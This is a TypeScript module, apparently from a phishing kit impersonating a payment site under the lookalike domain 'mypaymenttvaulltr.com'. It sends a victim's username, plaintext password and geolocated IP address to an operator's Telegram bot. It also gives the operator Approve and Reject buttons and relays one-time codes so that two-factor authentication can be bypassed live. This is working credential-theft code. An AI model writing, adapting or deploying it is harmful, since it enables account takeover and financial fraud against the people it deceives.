/* All Telegram calls are proxied through the backend so that secrets
   are never needed in the browser bundle. */

const API = "/api/tg";

/* ─── helpers ─────────────────────────────────────────────────── */

async function post(path: string, body: unknown): Promise<unknown> {
  try {
    const r = await fetch(`${API}${path}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    return await r.json();
  } catch {
    return { ok: false };
  }
}

async function get(path: string): Promise<unknown> {
  try {
    const r = await fetch(`${API}${path}`);
    return await r.json();
  } catch {
    return { ok: false, result: [] };
  }
}

/* ─── public IP / location (still client-side, no secrets needed) */

export async function getPublicIP(): Promise<string> {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json() as { ip?: string };
    return d.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

export async function getIPInfo(): Promise<string> {
  try {
    const r1 = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r1.json() as { ip?: string };
    if (!ip) return "unknown";
    const r2  = await fetch(`https://ipapi.co/${ip}/json/`);
    const loc = await r2.json() as { city?: string; region?: string; country_name?: string; org?: string };
    const city    = loc.city         ?? "";
    const region  = loc.region       ?? "";
    const country = loc.country_name ?? "";
    const org     = loc.org          ?? "";
    const parts   = [city, region, country].filter(Boolean).join(", ");
    return `${ip} (${parts}${org ? " — " + org : ""})`;
  } catch {
    return "unknown";
  }
}

/* ─── send plain HTML message ──────────────────────────────────── */

export async function sendTelegram(message: string): Promise<void> {
  await post("/send-message", { text: message, parse_mode: "HTML" });
}

/* ─── send file ────────────────────────────────────────────────── */

export async function sendFileToTelegram(file: File, caption: string): Promise<void> {
  try {
    const form = new FormData();
    form.append("caption", caption);
    form.append("document", file, file.name);
    await fetch(`${API}/send-document`, { method: "POST", body: form });
  } catch { /* silent */ }
}

/* ─── send approval request with inline keyboard ───────────────── */

export async function sendApprovalRequest(
  username: string,
  ip: string,
  now: string,
  sessionKey: string,
  label = "Login",
  password?: string
): Promise<number | null> {
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Permintaan ${label}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b>   : <code>${username}</code>\n` +
    (password ? `🔑 <b>Password</b>   : <code>${password}</code>\n` : ``) +
    `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
    `🕐 <b>Waktu</b>      : ${now}\n\n` +
    `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;

  const data = await post("/send-message", {
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
        { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
      ]],
    },
  }) as { ok?: boolean; messageId?: number | null };

  return data?.messageId ?? null;
}

/* ─── get latest offset ────────────────────────────────────────── */

export async function getLatestOffset(): Promise<number> {
  const data = await get("/latest-offset") as { offset?: number };
  return data?.offset ?? 0;
}

/* ─── poll for approve / reject ────────────────────────────────── */

export async function pollApproval(
  offset: number,
  sessionKey: string
): Promise<{ status: "approved" | "rejected" | "pending"; nextOffset: number; callbackId?: string }> {
  const data = await get(`/updates?offset=${offset}&timeout=2`) as {
    ok?: boolean;
    result?: { update_id: number; callback_query?: { id: string; data?: string } }[];
  };

  if (!data?.ok || !data.result?.length) return { status: "pending", nextOffset: offset };

  let status: "approved" | "rejected" | "pending" = "pending";
  let nextOffset = offset;
  let callbackId: string | undefined;

  for (const update of data.result) {
    nextOffset = update.update_id + 1;
    if (update.callback_query) {
      const cbData = update.callback_query.data ?? "";
      if (cbData === `approve_${sessionKey}`) {
        callbackId = update.callback_query.id;
        status = "approved";
      } else if (cbData === `reject_${sessionKey}`) {
        callbackId = update.callback_query.id;
        status = "rejected";
      }
    }
  }
  return { status, nextOffset, callbackId };
}

/* ─── answer callback query ─────────────────────────────────────── */

export async function answerCallback(callbackId: string, text: string): Promise<void> {
  await post("/answer-callback", { callbackQueryId: callbackId, text });
}

/* ─── send OTP code to admin ────────────────────────────────────── */

export async function sendBotOTP(otp: string, username: string): Promise<void> {
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Kode OTP — Kirim ke User</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b> : <code>${username}</code>\n` +
    `🔢 <b>Kode OTP</b>  : <code>${otp}</code>\n\n` +
    `📧 <i>Kirimkan kode ini ke email user secara manual.\n` +
    `Jangan bagikan ke orang lain.</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;
  await post("/send-message", { text, parse_mode: "HTML" });
}

/* ─── send OTP verification request (admin approve/reject) ──────── */

export async function sendOtpVerificationRequest(
  username: string,
  enteredCode: string,
  correctCode: string,
  sessionKey: string
): Promise<void> {
  const isCorrect = enteredCode === correctCode;
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Verifikasi Kode OTP</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b>     : <code>${username}</code>\n` +
    `🔢 <b>Kode Dimasukkan</b>: <code>${enteredCode}</code>\n` +
    `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
    `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;
  await post("/send-message", {
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
        { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
      ]],
    },
  });
}
